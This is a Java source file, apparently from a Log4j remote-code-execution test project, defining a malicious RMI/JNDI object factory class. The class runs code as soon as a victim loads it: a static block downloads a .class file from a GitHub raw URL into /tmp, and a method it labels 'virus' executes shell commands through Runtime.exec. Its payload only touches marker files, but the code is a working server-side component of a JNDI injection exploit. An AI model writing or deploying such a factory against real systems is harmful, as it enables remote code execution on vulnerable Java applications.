package com.rce.server.service;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Calendar;
import java.util.Hashtable;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.mzlion.easyokhttp.HttpClient;

public class HelloServiceImpl extends UnicastRemoteObject implements ObjectFactory,HelloService {
    static Logger log = LoggerFactory.getLogger(HelloServiceImpl.class);
    public HelloServiceImpl() throws RemoteException {}
    static volatile int count =0;
    static {
        try {
            log.info("执行漏洞代码[下载文件]");
            downloadVirus();
            System.out.println("完成执行漏洞代码");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String hello() throws RemoteException{
        log.info("Start execute virus --------- >");

        try {
            String[] commands = {"touch", "/tmp/aTestVirus.txt." + count++};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();

        }catch(Exception ex){
            ex.printStackTrace();
        }
        finally {
            log.info("End execute virus --------- >");
        }

        return "Hello";
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return new HelloServiceImpl();
    }

    private static void downloadVirus() {

        File f = new File("/tmp/HelloServiceImpl.class");
        HttpClient.get("https://raw.githubusercontent.com/scuecs/Log4jRCETest/main/doc/HelloServiceImpl.class").asFile(f);
    }
}
